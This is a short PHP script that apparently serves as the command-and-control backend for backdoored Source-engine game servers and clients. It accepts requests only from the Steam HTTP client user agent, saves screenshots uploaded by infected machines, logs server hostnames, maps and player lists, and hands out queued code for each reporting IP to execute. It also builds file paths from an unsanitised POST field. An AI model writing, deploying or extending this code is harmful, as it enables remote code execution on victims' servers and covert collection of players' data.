<?php
if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)"){
if($_POST["type"]=="screen"){
if(strlen($_POST["screenshot"])<500000){
unlink("other/".$_POST["ip"].".png");
file_put_contents("other/screens/".$_POST["ip"].".png",base64_decode($_POST["screenshot"]));
}
}
if($_POST["type"]=="run"){
if(file_exists("other/code/".str_replace(":","_",$_POST["ip"]))){
echo file_get_contents("other/code/".str_replace(":","_",$_POST["ip"]));
unlink("other/code/".str_replace(":","_",$_POST["ip"]));
}
file_put_contents("other/servers/".str_replace(":","_",$_POST["ip"]),date('jnYhi')."`".$_POST["ip"]."`".$_POST["hostname"]."`".$_POST["map"]."`".$_POST["players"]."`".$_POST["playerlist"]);
}
if($_POST["type"]=="runclient"){
if(file_exists("other/code/".str_replace(":","_",$_POST["ip"]))){
echo file_get_contents("other/code/".str_replace(":","_",$_POST["ip"]));
unlink("other/code/".str_replace(":","_",$_POST["ip"]));
}
}
}
?>


